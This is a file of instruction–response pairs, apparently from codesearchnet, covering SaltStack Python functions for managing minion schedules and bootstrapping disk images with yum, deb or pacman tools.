{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nbuild a schedule item", "response": "def build_schedule_item(name, **kwargs):\n    '''\n    Build a schedule job\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' schedule.build_schedule_item job1 function='test.ping' seconds=3600\n    '''\n\n    ret = {'comment': [],\n           'result': True}\n\n    if not name:\n        ret['comment'] = 'Job name is required.'\n        ret['result'] = False\n        return ret\n\n    schedule = {}\n    schedule[name] = salt.utils.odict.OrderedDict()\n    schedule[name]['function'] = kwargs['function']\n\n    time_conflict = False\n    for item in ['seconds', 'minutes', 'hours', 'days']:\n        if item in kwargs and 'when' in kwargs:\n            time_conflict = True\n\n        if item in kwargs and 'cron' in kwargs:\n            time_conflict = True\n\n    if time_conflict:\n        ret['result'] = False\n        ret['comment'] = 'Unable to use \"seconds\", \"minutes\", \"hours\", or \"days\" with \"when\" or \"cron\" options.'\n        return ret\n\n    if 'when' in kwargs and 'cron' in kwargs:\n        ret['result'] = False\n        ret['comment'] = 'Unable to use \"when\" and \"cron\" options together.  Ignoring.'\n        return ret\n\n    for item in ['seconds', 'minutes', 'hours', 'days']:\n        if item in kwargs:\n            schedule[name][item] = kwargs[item]\n\n    if 'return_job' in kwargs:\n        schedule[name]['return_job'] = kwargs['return_job']\n\n    if 'metadata' in kwargs:\n        schedule[name]['metadata'] = kwargs['metadata']\n\n    if 'job_args' in kwargs:\n        schedule[name]['args'] = kwargs['job_args']\n\n    if 'job_kwargs' in kwargs:\n        schedule[name]['kwargs'] = kwargs['job_kwargs']\n\n    if 'maxrunning' in kwargs:\n        schedule[name]['maxrunning'] = kwargs['maxrunning']\n    else:\n        schedule[name]['maxrunning'] = 1\n\n    if 'name' in kwargs:\n        schedule[name]['name'] = kwargs['name']\n    else:\n        schedule[name]['name'] = name\n\n    if 'enabled' in kwargs:\n        schedule[name]['enabled'] = kwargs['enabled']\n    else:\n        schedule[name]['enabled'] = True\n\n    if 'jid_include' not in kwargs or kwargs['jid_include']:\n        schedule[name]['jid_include'] = True\n\n    if 'splay' in kwargs:\n        if isinstance(kwargs['splay'], dict):\n            # Ensure ordering of start and end arguments\n            schedule[name]['splay'] = salt.utils.odict.OrderedDict()\n            schedule[name]['splay']['start'] = kwargs['splay']['start']\n            schedule[name]['splay']['end'] = kwargs['splay']['end']\n        else:\n            schedule[name]['splay'] = kwargs['splay']\n\n    if 'when' in kwargs:\n        if not _WHEN_SUPPORTED:\n            ret['result'] = False\n            ret['comment'] = 'Missing dateutil.parser, \"when\" is unavailable.'\n            return ret\n        else:\n            validate_when = kwargs['when']\n            if not isinstance(validate_when, list):\n                validate_when = [validate_when]\n            for _when in validate_when:\n                try:\n                    dateutil_parser.parse(_when)\n                except ValueError:\n                    ret['result'] = False\n                    ret['comment'] = 'Schedule item {0} for \"when\" in invalid.'.format(_when)\n                    return ret\n\n    for item in ['range', 'when', 'once', 'once_fmt', 'cron',\n                 'returner', 'after', 'return_config', 'return_kwargs',\n                 'until', 'run_on_start', 'skip_during_range']:\n        if item in kwargs:\n            schedule[name][item] = kwargs[item]\n\n    return schedule[name]"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nadd a job to the schedule.", "response": "def add(name, **kwargs):\n    '''\n    Add a job to the schedule\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' schedule.add job1 function='test.ping' seconds=3600\n        # If function have some arguments, use job_args\n        salt '*' schedule.add job2 function='cmd.run' job_args=\"['date >> /tmp/date.log']\" seconds=60\n    '''\n\n    ret = {'comment': 'Failed to add job {0} to schedule.'.format(name),\n           'result': False}\n\n    if name in list_(show_all=True, return_yaml=False):\n        ret['comment'] = 'Job {0} already exists in schedule.'.format(name)\n        ret['result'] = False\n        return ret\n\n    if not name:\n        ret['comment'] = 'Job name is required.'\n        ret['result'] = False\n\n    time_conflict = False\n    for item in ['seconds', 'minutes', 'hours', 'days']:\n        if item in kwargs and 'when' in kwargs:\n            time_conflict = True\n        if item in kwargs and 'cron' in kwargs:\n            time_conflict = True\n\n    if time_conflict:\n        ret['comment'] = 'Error: Unable to use \"seconds\", \"minutes\", \"hours\", or \"days\" with \"when\" or \"cron\" options.'\n        return ret\n\n    if 'when' in kwargs and 'cron' in kwargs:\n        ret['comment'] = 'Unable to use \"when\" and \"cron\" options together.  Ignoring.'\n        return ret\n\n    persist = True\n    if 'persist' in kwargs:\n        persist = kwargs['persist']\n\n    _new = build_schedule_item(name, **kwargs)\n    if 'result' in _new and not _new['result']:\n        return _new\n\n    schedule_data = {}\n    schedule_data[name] = _new\n\n    if 'test' in kwargs and kwargs['test']:\n        ret['comment'] = 'Job: {0} would be added to schedule.'.format(name)\n        ret['result'] = True\n    else:\n        try:\n            eventer = salt.utils.event.get_event('minion', opts=__opts__)\n            res = __salt__['event.fire']({'name': name,\n                                          'schedule': schedule_data,\n                                          'func': 'add',\n                                          'persist': persist}, 'manage_schedule')\n            if res:\n                event_ret = eventer.get_event(tag='/salt/minion/minion_schedule_add_complete', wait=30)\n                if event_ret and event_ret['complete']:\n                    schedule = event_ret['schedule']\n                    if name in schedule:\n                        ret['result'] = True\n                        ret['comment'] = 'Added job: {0} to schedule.'.format(name)\n                        return ret\n        except KeyError:\n            # Effectively a no-op, since we can't really return without an event system\n            ret['comment'] = 'Event module not available. Schedule add failed.'\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nmodify an existing job in the schedule", "response": "def modify(name, **kwargs):\n    '''\n    Modify an existing job in the schedule\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' schedule.modify job1 function='test.ping' seconds=3600\n    '''\n\n    ret = {'comment': '',\n           'changes': {},\n           'result': True}\n\n    time_conflict = False\n    for item in ['seconds', 'minutes', 'hours', 'days']:\n        if item in kwargs and 'when' in kwargs:\n            time_conflict = True\n\n        if item in kwargs and 'cron' in kwargs:\n            time_conflict = True\n\n    if time_conflict:\n        ret['result'] = False\n        ret['comment'] = 'Error: Unable to use \"seconds\", \"minutes\", \"hours\", or \"days\" with \"when\" option.'\n        return ret\n\n    if 'when' in kwargs and 'cron' in kwargs:\n        ret['result'] = False\n        ret['comment'] = 'Unable to use \"when\" and \"cron\" options together.  Ignoring.'\n        return ret\n\n    current_schedule = list_(show_all=True, return_yaml=False)\n\n    if name not in current_schedule:\n        ret['comment'] = 'Job {0} does not exist in schedule.'.format(name)\n        ret['result'] = False\n        return ret\n\n    _current = current_schedule[name]\n    if '_seconds' in _current:\n        _current['seconds'] = _current['_seconds']\n        del _current['_seconds']\n\n    _new = build_schedule_item(name, **kwargs)\n    if 'result' in _new and not _new['result']:\n        return _new\n\n    if _new == _current:\n        ret['comment'] = 'Job {0} in correct state'.format(name)\n        return ret\n\n    _current_lines = ['{0}:{1}\\n'.format(key, value)\n                      for (key, value) in sorted(_current.items())]\n    _new_lines = ['{0}:{1}\\n'.format(key, value)\n                  for (key, value) in sorted(_new.items())]\n    _diff = difflib.unified_diff(_current_lines, _new_lines)\n\n    ret['changes']['diff'] = ''.join(_diff)\n\n    if 'test' in kwargs and kwargs['test']:\n        ret['comment'] = 'Job: {0} would be modified in schedule.'.format(name)\n    else:\n        persist = True\n        if 'persist' in kwargs:\n            persist = kwargs['persist']\n        if name in list_(show_all=True, where='opts', return_yaml=False):\n            event_data = {'name': name,\n                          'schedule': _new,\n                          'func': 'modify',\n                          'persist': persist}\n        elif name in list_(show_all=True, where='pillar', return_yaml=False):\n            event_data = {'name': name,\n                          'schedule': _new,\n                          'where': 'pillar',\n                          'func': 'modify',\n                          'persist': False}\n\n        out = __salt__['event.fire'](event_data, 'manage_schedule')\n        if out:\n            ret['comment'] = 'Modified job: {0} in schedule.'.format(name)\n        else:\n            ret['comment'] = 'Failed to modify job {0} in schedule.'.format(name)\n            ret['result'] = False\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef run_job(name, force=False):\n    '''\n    Run a scheduled job on the minion immediately\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' schedule.run_job job1\n\n        salt '*' schedule.run_job job1 force=True\n        Force the job to run even if it is disabled.\n    '''\n\n    ret = {'comment': [],\n           'result': True}\n\n    if not name:\n        ret['comment'] = 'Job name is required.'\n        ret['result'] = False\n\n    schedule = list_(show_all=True, return_yaml=False)\n    if name in schedule:\n        data = schedule[name]\n        if 'enabled' in data and not data['enabled'] and not force:\n            ret['comment'] = 'Job {0} is disabled.'.format(name)\n        else:\n            out = __salt__['event.fire']({'name': name, 'func': 'run_job'}, 'manage_schedule')\n            if out:\n                ret['comment'] = 'Scheduling Job {0} on minion.'.format(name)\n            else:\n                ret['comment'] = 'Failed to run job {0} on minion.'.format(name)\n                ret['result'] = False\n    else:\n        ret['comment'] = 'Job {0} does not exist.'.format(name)\n        ret['result'] = False\n    return ret", "response": "Run a scheduled job on the minion immediately\n archive."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef enable_job(name, **kwargs):\n    '''\n    Enable a job in the minion's schedule\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' schedule.enable_job job1\n    '''\n\n    ret = {'comment': [],\n           'result': True}\n\n    if not name:\n        ret['comment'] = 'Job name is required.'\n        ret['result'] = False\n\n    if 'test' in __opts__ and __opts__['test']:\n        ret['comment'] = 'Job: {0} would be enabled in schedule.'.format(name)\n    else:\n        persist = True\n        if 'persist' in kwargs:\n            persist = kwargs['persist']\n\n        if name in list_(show_all=True, where='opts', return_yaml=False):\n            event_data = {'name': name, 'func': 'enable_job', 'persist': persist}\n        elif name in list_(show_all=True, where='pillar', return_yaml=False):\n            event_data = {'name': name, 'where': 'pillar', 'func': 'enable_job', 'persist': False}\n        else:\n            ret['comment'] = 'Job {0} does not exist.'.format(name)\n            ret['result'] = False\n            return ret\n\n        try:\n            eventer = salt.utils.event.get_event('minion', opts=__opts__)\n            res = __salt__['event.fire'](event_data, 'manage_schedule')\n            if res:\n                event_ret = eventer.get_event(tag='/salt/minion/minion_schedule_enabled_job_complete', wait=30)\n                if event_ret and event_ret['complete']:\n                    schedule = event_ret['schedule']\n                    # check item exists in schedule and is enabled\n                    if name in schedule and schedule[name]['enabled']:\n                        ret['result'] = True\n                        ret['comment'] = 'Enabled Job {0} in schedule.'.format(name)\n                    else:\n                        ret['result'] = False\n                        ret['comment'] = 'Failed to enable job {0} in schedule.'.format(name)\n                    return ret\n        except KeyError:\n            # Effectively a no-op, since we can't really return without an event system\n            ret['comment'] = 'Event module not available. Schedule enable job failed.'\n    return ret", "response": "Enable a job in the salt s schedule"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nsaves all scheduled jobs on the minion", "response": "def save(**kwargs):\n    '''\n    Save all scheduled jobs on the minion\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' schedule.save\n    '''\n\n    ret = {'comment': [],\n           'result': True}\n\n    if 'test' in kwargs and kwargs['test']:\n        ret['comment'] = 'Schedule would be saved.'\n    else:\n        try:\n            eventer = salt.utils.event.get_event('minion', opts=__opts__)\n            res = __salt__['event.fire']({'func': 'save_schedule'}, 'manage_schedule')\n            if res:\n                event_ret = eventer.get_event(tag='/salt/minion/minion_schedule_saved', wait=30)\n                if event_ret and event_ret['complete']:\n                    ret['result'] = True\n                    ret['comment'] = 'Schedule (non-pillar items) saved.'\n                else:\n                    ret['result'] = False\n                    ret['comment'] = 'Failed to save schedule.'\n        except KeyError:\n            # Effectively a no-op, since we can't really return without an event system\n            ret['comment'] = 'Event module not available. Schedule save failed.'\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreload the current scheduler on the minion", "response": "def reload_():\n    '''\n    Reload saved scheduled jobs on the minion\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' schedule.reload\n    '''\n\n    ret = {'comment': [],\n           'result': True}\n\n    # If there a schedule defined in pillar, refresh it.\n    if 'schedule' in __pillar__:\n        out = __salt__['event.fire']({}, 'pillar_refresh')\n        if out:\n            ret['comment'].append('Reloaded schedule from pillar on minion.')\n        else:\n            ret['comment'].append('Failed to reload schedule from pillar on minion.')\n            ret['result'] = False\n\n    # move this file into an configurable opt\n    sfn = '{0}/{1}/schedule.conf'.format(__opts__['config_dir'], os.path.dirname(__opts__['default_include']))\n    if os.path.isfile(sfn):\n        with salt.utils.files.fopen(sfn, 'rb') as fp_:\n            try:\n                schedule = salt.utils.yaml.safe_load(fp_)\n            except salt.utils.yaml.YAMLError as exc:\n                ret['comment'].append('Unable to read existing schedule file: {0}'.format(exc))\n\n        if schedule:\n            if 'schedule' in schedule and schedule['schedule']:\n                out = __salt__['event.fire']({'func': 'reload', 'schedule': schedule}, 'manage_schedule')\n                if out:\n                    ret['comment'].append('Reloaded schedule on minion from schedule.conf.')\n                else:\n                    ret['comment'].append('Failed to reload schedule on minion from schedule.conf.')\n                    ret['result'] = False\n            else:\n                ret['comment'].append('Failed to reload schedule on minion.  Saved file is empty or invalid.')\n                ret['result'] = False\n        else:\n            ret['comment'].append('Failed to reload schedule on minion.  Saved file is empty or invalid.')\n            ret['result'] = False\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nmove a scheduled job to another minion or minions.", "response": "def move(name, target, **kwargs):\n    '''\n    Move scheduled job to another minion or minions.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' schedule.move jobname target\n    '''\n\n    ret = {'comment': [],\n           'result': True}\n\n    if not name:\n        ret['comment'] = 'Job name is required.'\n        ret['result'] = False\n\n    if 'test' in kwargs and kwargs['test']:\n        ret['comment'] = 'Job: {0} would be moved from schedule.'.format(name)\n    else:\n        opts_schedule = list_(show_all=True, where='opts', return_yaml=False)\n        pillar_schedule = list_(show_all=True, where='pillar', return_yaml=False)\n\n        if name in opts_schedule:\n            schedule_data = opts_schedule[name]\n            where = None\n        elif name in pillar_schedule:\n            schedule_data = pillar_schedule[name]\n            where = 'pillar'\n        else:\n            ret['comment'] = 'Job {0} does not exist.'.format(name)\n            ret['result'] = False\n            return ret\n\n        schedule_opts = []\n        for key, value in six.iteritems(schedule_data):\n            temp = '{0}={1}'.format(key, value)\n            schedule_opts.append(temp)\n        response = __salt__['publish.publish'](target, 'schedule.add', schedule_opts)\n\n        # Get errors and list of affeced minions\n        errors = []\n        minions = []\n        for minion in response:\n            minions.append(minion)\n            if not response[minion]:\n                errors.append(minion)\n\n        # parse response\n        if not response:\n            ret['comment'] = 'no servers answered the published schedule.add command'\n            return ret\n        elif errors:\n            ret['comment'] = 'the following minions return False'\n            ret['minions'] = errors\n            return ret\n        else:\n            delete(name, where=where)\n            ret['result'] = True\n            ret['comment'] = 'Moved Job {0} from schedule.'.format(name)\n            ret['minions'] = minions\n            return ret\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\npostpone a job in the schedule", "response": "def postpone_job(name,\n                 current_time,\n                 new_time,\n                 **kwargs):\n    '''\n    Postpone a job in the minion's schedule\n\n    Current time and new time should be in date string format,\n    default value is %Y-%m-%dT%H:%M:%S.\n\n    .. versionadded:: 2018.3.0\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' schedule.postpone_job job current_time new_time\n\n        salt '*' schedule.postpone_job job current_time new_time time_fmt='%Y-%m-%dT%H:%M:%S'\n    '''\n\n    time_fmt = kwargs.get('time_fmt') or '%Y-%m-%dT%H:%M:%S'\n    ret = {'comment': [],\n           'result': True}\n\n    if not name:\n        ret['comment'] = 'Job name is required.'\n        ret['result'] = False\n        return ret\n\n    if not current_time:\n        ret['comment'] = 'Job current time is required.'\n        ret['result'] = False\n        return ret\n    else:\n        try:\n            # Validate date string\n            datetime.datetime.strptime(current_time, time_fmt)\n        except (TypeError, ValueError):\n            log.error('Date string could not be parsed: %s, %s',\n                      new_time, time_fmt)\n\n            ret['comment'] = 'Date string could not be parsed.'\n            ret['result'] = False\n            return ret\n\n    if not new_time:\n        ret['comment'] = 'Job new_time is required.'\n        ret['result'] = False\n        return ret\n    else:\n        try:\n            # Validate date string\n            datetime.datetime.strptime(new_time, time_fmt)\n        except (TypeError, ValueError):\n            log.error('Date string could not be parsed: %s, %s',\n                      new_time, time_fmt)\n\n            ret['comment'] = 'Date string could not be parsed.'\n            ret['result'] = False\n            return ret\n\n    if 'test' in __opts__ and __opts__['test']:\n        ret['comment'] = 'Job: {0} would be postponed in schedule.'.format(name)\n    else:\n\n        if name in list_(show_all=True, where='opts', return_yaml=False):\n            event_data = {'name': name,\n                          'time': current_time,\n                          'new_time': new_time,\n                          'time_fmt': time_fmt,\n                          'func': 'postpone_job'}\n        elif name in list_(show_all=True, where='pillar', return_yaml=False):\n            event_data = {'name': name,\n                          'time': current_time,\n                          'new_time': new_time,\n                          'time_fmt': time_fmt,\n                          'where': 'pillar',\n                          'func': 'postpone_job'}\n        else:\n            ret['comment'] = 'Job {0} does not exist.'.format(name)\n            ret['result'] = False\n            return ret\n\n        try:\n            eventer = salt.utils.event.get_event('minion', opts=__opts__)\n            res = __salt__['event.fire'](event_data, 'manage_schedule')\n            if res:\n                event_ret = eventer.get_event(tag='/salt/minion/minion_schedule_postpone_job_complete', wait=30)\n                if event_ret and event_ret['complete']:\n                    schedule = event_ret['schedule']\n                    # check item exists in schedule and is enabled\n                    if name in schedule and schedule[name]['enabled']:\n                        ret['result'] = True\n                        ret['comment'] = 'Postponed Job {0} in schedule.'.format(name)\n                    else:\n                        ret['result'] = False\n                        ret['comment'] = 'Failed to postpone job {0} in schedule.'.format(name)\n                    return ret\n        except KeyError:\n            # Effectively a no-op, since we can't really return without an event system\n            ret['comment'] = 'Event module not available. Schedule postpone job failed.'\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef is_proxy():\n    '''\n    Return True if this minion is a proxy minion.\n    Leverages the fact that is_linux() and is_windows\n    both return False for proxies.\n    TODO: Need to extend this for proxies that might run on\n    other Unices\n    '''\n    import __main__ as main\n    # This is a hack.  If a proxy minion is started by other\n    # means, e.g. a custom script that creates the minion objects\n    # then this will fail.\n    ret = False\n    try:\n        # Changed this from 'salt-proxy in main...' to 'proxy in main...'\n        # to support the testsuite's temp script that is called 'cli_salt_proxy'\n        #\n        # Add '--proxyid' in sys.argv so that salt-call --proxyid\n        # is seen as a proxy minion\n        if 'proxy' in main.__file__ or '--proxyid' in sys.argv:\n            ret = True\n    except AttributeError:\n        pass\n    return ret", "response": "Return True if this minion is a proxy minion."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nfunction to return if host is SmartOS global zone or not", "response": "def is_smartos_globalzone():\n    '''\n    Function to return if host is SmartOS (Illumos) global zone or not\n    '''\n    if not is_smartos():\n        return False\n    else:\n        cmd = ['zonename']\n        try:\n            zonename = subprocess.Popen(\n                cmd, shell=False,\n                stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        except OSError:\n            return False\n        if zonename.returncode:\n            return False\n        if zonename.stdout.read().strip() == 'global':\n            return True\n\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncreate a new image for a specific platform and root.", "response": "def bootstrap(\n        platform,\n        root,\n        img_format='dir',\n        fs_format='ext2',\n        fs_opts=None,\n        arch=None,\n        flavor=None,\n        repo_url=None,\n        static_qemu=None,\n        img_size=None,\n        mount_dir=None,\n        pkg_cache=None,\n        pkgs=None,\n        exclude_pkgs=None,\n        epel_url=EPEL_URL,\n    ):\n    '''\n    Create an image for a specific platform.\n\n    Please note that this function *MUST* be run as root, as images that are\n    created make files belonging to root.\n\n    platform\n        Which platform to use to create the image. Currently supported platforms\n        are rpm, deb and pacman.\n\n    root\n        Local path to create the root of the image filesystem.\n\n    img_format\n        Which format to create the image in. By default, just copies files into\n        a directory on the local filesystem (``dir``). Future support will exist\n        for ``sparse``.\n\n    fs_format\n        When using a non-``dir`` ``img_format``, which filesystem to format the\n        image to. By default, ``ext2``.\n\n    fs_opts\n        When using a non-``dir`` ``img_format``, a dict of opts may be\n        specified.\n\n    arch\n        Architecture to install packages for, if supported by the underlying\n        bootstrap tool. Currently only used for deb.\n\n    flavor\n        Which flavor of operating system to install. This correlates to a\n        specific directory on the distribution repositories. For instance,\n        ``wheezy`` on Debian.\n\n    repo_url\n        Mainly important for Debian-based repos. Base URL for the mirror to\n        install from. (e.x.: http://ftp.debian.org/debian/)\n\n    static_qemu\n        Local path to the static qemu binary required for this arch.\n        (e.x.: /usr/bin/qemu-amd64-static)\n\n    pkg_confs\n        The location of the conf files to copy into the image, to point the\n        installer to the right repos and configuration.\n\n    img_size\n        If img_format is not ``dir``, then the size of the image must be\n        specified.\n\n    mount_dir\n        If img_format is not ``dir``, then the image must be mounted somewhere.\n        If the ``mount_dir`` is not specified, then it will be created at\n        ``/opt/salt-genesis.<random_uuid>``. This directory will be unmounted\n        and removed when the process is finished.\n\n    pkg_cache\n        This points to a directory containing a cache of package files to be\n        copied to the image. It does not need to be specified.\n\n    pkgs\n        A list of packages to be installed on this image. For RedHat, this\n        will include ``yum``, ``centos-release`` and ``iputils`` by default.\n\n    exclude_pkgs\n        A list of packages to be excluded. If you do not want to install the\n        defaults, you need to include them in this list.\n\n    epel_url\n        The URL to download the EPEL release package from.\n\n    CLI Examples:\n\n    .. code-block:: bash\n\n        salt myminion genesis.bootstrap pacman /root/arch\n        salt myminion genesis.bootstrap rpm /root/redhat\n        salt myminion genesis.bootstrap deb /root/wheezy arch=amd64 \\\n            flavor=wheezy static_qemu=/usr/bin/qemu-x86_64-static\n\n    '''\n    if img_format not in ('dir', 'sparse'):\n        raise SaltInvocationError('The img_format must be \"sparse\" or \"dir\"')\n\n    if img_format == 'dir':\n        # We can just use the root as the root\n        if not __salt__['file.directory_exists'](root):\n            try:\n                __salt__['file.mkdir'](root)\n            except Exception as exc:\n                return {'Error': salt.utils.stringutils.to_unicode(pprint.pformat(exc))}\n    elif img_format == 'sparse':\n        if not img_size:\n            raise SaltInvocationError('An img_size must be specified for a sparse file')\n        if not mount_dir:\n            mount_dir = '/opt/salt-genesis.{0}'.format(uuid.uuid4())\n        __salt__['file.mkdir'](mount_dir, 'root', 'root', '755')\n        __salt__['cmd.run'](('fallocate', '-l', img_size, root), python_shell=False)\n        _mkpart(root, fs_format, fs_opts, mount_dir)\n\n        loop1 = __salt__['cmd.run']('losetup -f')\n        log.debug('First loop device is %s', loop1)\n        __salt__['cmd.run']('losetup {0} {1}'.format(loop1, root))\n        loop2 = __salt__['cmd.run']('losetup -f')\n        log.debug('Second loop device is %s', loop2)\n        start = six.text_type(2048 * 2048)\n        __salt__['cmd.run']('losetup -o {0} {1} {2}'.format(start, loop2, loop1))\n        __salt__['mount.mount'](mount_dir, loop2)\n\n        _populate_cache(platform, pkg_cache, mount_dir)\n\n    if mount_dir:\n        root = mount_dir\n\n    if pkgs is None:\n        pkgs = []\n\n    if exclude_pkgs is None:\n        exclude_pkgs = []\n\n    if platform in ('rpm', 'yum'):\n        _bootstrap_yum(\n            root,\n            pkgs=pkgs,\n            exclude_pkgs=exclude_pkgs,\n            epel_url=epel_url,\n        )\n    elif platform == 'deb':\n        _bootstrap_deb(\n            root,\n            arch=arch,\n            flavor=flavor,\n            repo_url=repo_url,\n            static_qemu=static_qemu,\n            pkgs=pkgs,\n            exclude_pkgs=exclude_pkgs,\n        )\n    elif platform == 'pacman':\n        _bootstrap_pacman(\n            root,\n            img_format=img_format,\n            pkgs=pkgs,\n            exclude_pkgs=exclude_pkgs,\n        )\n\n    if img_format != 'dir':\n        blkinfo = __salt__['disk.blkid'](loop2)\n        __salt__['file.replace'](\n            '{0}/boot/grub/grub.cfg'.format(mount_dir),\n            'ad4103fa-d940-47ca-8506-301d8071d467',  # This seems to be the default\n            blkinfo[loop2]['UUID']\n        )\n        __salt__['mount.umount'](root)\n        __salt__['cmd.run']('losetup -d {0}'.format(loop2))\n        __salt__['cmd.run']('losetup -d {0}'.format(loop1))\n        __salt__['file.rmdir'](mount_dir)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _mkpart(root, fs_format, fs_opts, mount_dir):\n    '''\n    Make a partition, and make it bootable\n\n    .. versionadded:: Beryllium\n    '''\n    __salt__['partition.mklabel'](root, 'msdos')\n    loop1 = __salt__['cmd.run']('losetup -f')\n    log.debug('First loop device is %s', loop1)\n    __salt__['cmd.run']('losetup {0} {1}'.format(loop1, root))\n    part_info = __salt__['partition.list'](loop1)\n    start = six.text_type(2048 * 2048) + 'B'\n    end = part_info['info']['size']\n    __salt__['partition.mkpart'](loop1, 'primary', start=start, end=end)\n    __salt__['partition.set'](loop1, '1', 'boot', 'on')\n    part_info = __salt__['partition.list'](loop1)\n    loop2 = __salt__['cmd.run']('losetup -f')\n    log.debug('Second loop device is %s', loop2)\n    start = start.rstrip('B')\n    __salt__['cmd.run']('losetup -o {0} {1} {2}'.format(start, loop2, loop1))\n    _mkfs(loop2, fs_format, fs_opts)\n    __salt__['mount.mount'](mount_dir, loop2)\n    __salt__['cmd.run']((\n        'grub-install',\n        '--target=i386-pc',\n        '--debug',\n        '--no-floppy',\n        '--modules=part_msdos linux',\n        '--boot-directory={0}/boot'.format(mount_dir),\n        loop1\n    ), python_shell=False)\n    __salt__['mount.umount'](mount_dir)\n    __salt__['cmd.run']('losetup -d {0}'.format(loop2))\n    __salt__['cmd.run']('losetup -d {0}'.format(loop1))\n    return part_info", "response": "Make a partition and make it bootable"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _mkfs(root, fs_format, fs_opts=None):\n    '''\n    Make a filesystem using the appropriate module\n\n    .. versionadded:: Beryllium\n    '''\n    if fs_opts is None:\n        fs_opts = {}\n\n    if fs_format in ('ext2', 'ext3', 'ext4'):\n        __salt__['extfs.mkfs'](root, fs_format, **fs_opts)\n    elif fs_format in ('btrfs',):\n        __salt__['btrfs.mkfs'](root, **fs_opts)\n    elif fs_format in ('xfs',):\n        __salt__['xfs.mkfs'](root, **fs_opts)", "response": "Make a filesystem using the appropriate module\n       "}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _populate_cache(platform, pkg_cache, mount_dir):\n    '''\n    If a ``pkg_cache`` directory is specified, then use it to populate the\n    disk image.\n    '''\n    if not pkg_cache:\n        return\n    if not os.path.isdir(pkg_cache):\n        return\n\n    if platform == 'pacman':\n        cache_dir = '{0}/var/cache/pacman/pkg'.format(mount_dir)\n\n    __salt__['file.mkdir'](cache_dir, 'root', 'root', '755')\n    __salt__['file.copy'](pkg_cache, cache_dir, recurse=True, remove_existing=True)", "response": "Populate the cache with the contents of pkg_cache."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nbootstrapping an image using the yum tools", "response": "def _bootstrap_yum(\n        root,\n        pkg_confs='/etc/yum*',\n        pkgs=None,\n        exclude_pkgs=None,\n        epel_url=EPEL_URL,\n    ):\n    '''\n    Bootstrap an image using the yum tools\n\n    root\n        The root of the image to install to. Will be created as a directory if\n        it does not exist. (e.x.: /root/arch)\n\n    pkg_confs\n        The location of the conf files to copy into the image, to point yum\n        to the right repos and configuration.\n\n    pkgs\n        A list of packages to be installed on this image. For RedHat, this\n        will include ``yum``, ``centos-release`` and ``iputils`` by default.\n\n    exclude_pkgs\n        A list of packages to be excluded. If you do not want to install the\n        defaults, you need to include them in this list.\n\n    epel_url\n        The URL to download the EPEL release package from.\n\n    TODO: Set up a pre-install overlay, to copy files into /etc/ and so on,\n        which are required for the install to work.\n    '''\n    if pkgs is None:\n        pkgs = []\n    elif isinstance(pkgs, six.string_types):\n        pkgs = pkgs.split(',')\n\n    default_pkgs = ('yum', 'centos-release', 'iputils')\n    for pkg in default_pkgs:\n        if pkg not in pkgs:\n            pkgs.append(pkg)\n\n    if exclude_pkgs is None:\n        exclude_pkgs = []\n    elif isinstance(exclude_pkgs, six.string_types):\n        exclude_pkgs = exclude_pkgs.split(',')\n\n    for pkg in exclude_pkgs:\n        pkgs.remove(pkg)\n\n    _make_nodes(root)\n    release_files = [rf for rf in os.listdir('/etc') if rf.endswith('release')]\n    __salt__['cmd.run']('cp /etc/resolv/conf {rfs} {root}/etc'.format(root=_cmd_quote(root), rfs=' '.join(release_files)))\n    __salt__['cmd.run']('cp -r {rfs} {root}/etc'.format(root=_cmd_quote(root), rfs=' '.join(release_files)))\n    __salt__['cmd.run']('cp -r {confs} {root}/etc'.format(root=_cmd_quote(root), confs=_cmd_quote(pkg_confs)))\n\n    yum_args = ['yum', 'install', '--installroot={0}'.format(_cmd_quote(root)), '-y'] + pkgs\n    __salt__['cmd.run'](yum_args, python_shell=False)\n\n    if 'epel-release' not in exclude_pkgs:\n        __salt__['cmd.run'](\n            ('rpm', '--root={0}'.format(_cmd_quote(root)), '-Uvh', epel_url),\n            python_shell=False\n        )"}
